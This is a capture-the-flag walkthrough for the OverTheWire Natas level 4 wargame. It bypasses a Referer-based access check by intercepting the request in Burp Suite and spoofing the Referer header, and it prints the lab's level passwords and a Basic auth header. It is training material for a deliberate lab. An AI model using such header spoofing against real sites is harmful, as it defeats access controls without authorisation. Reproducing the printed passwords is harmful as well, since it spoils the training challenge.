Challenge Information

Natas Level 3 → Level 4

Username: natas4
URL:      http://natas4.natas.labs.overthewire.org


Solution

1. Check the source page.

```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>

```

2. Hahaha, found anything, Nothing na??? basically refreshing the page is just redirecting to index.php. But doing so will reveal the the we are posting the position from which we are being re-directed. As the line says that users should come only from natas5 user. We gotta change header file to impoersonate natas5. 
3. Open BurpSuite{The best things to intercept message and networks in between}. head to Proxy and Open brower and post the URL http://natas4.natas.labs.overthewire.org
4. Enter the passowrd and all
5. Open the intercept in BurpSuite. and Refresh the page
6. Check the header files in BurpSuite.

```
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas5.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

```
7. Change the Referer to natas5.natas.labs.overthewire.org. And Send the request
8. Here you have the password 0n35PkggAPm2zbEpOU802c0x0Msn1ToK